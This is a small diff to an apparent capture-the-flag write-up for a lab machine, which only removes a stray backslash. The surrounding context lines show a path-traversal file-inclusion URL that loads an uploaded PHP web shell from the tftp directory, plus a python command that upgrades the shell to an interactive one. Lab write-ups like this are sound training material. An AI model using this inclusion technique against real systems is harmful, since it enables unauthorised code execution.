@@ -38,7 +38,7 @@ In the passwd we can see that the path of the tftp user is /var/lib/tftpboot, so
 http://10.10.10.55/?file=../../../../../../../../../../../var/lib/tftpboot/shell-eldruin.php  
 ![alt text](./img/included08.PNG?raw=true)  
 
-HABEMUS SHELL \o/\
+HABEMUS SHELL \o/
 
 ## Privesc  
 Run this command to get a better shell -> python3 -c 'import pty;pty.spawn("/bin/bash")'
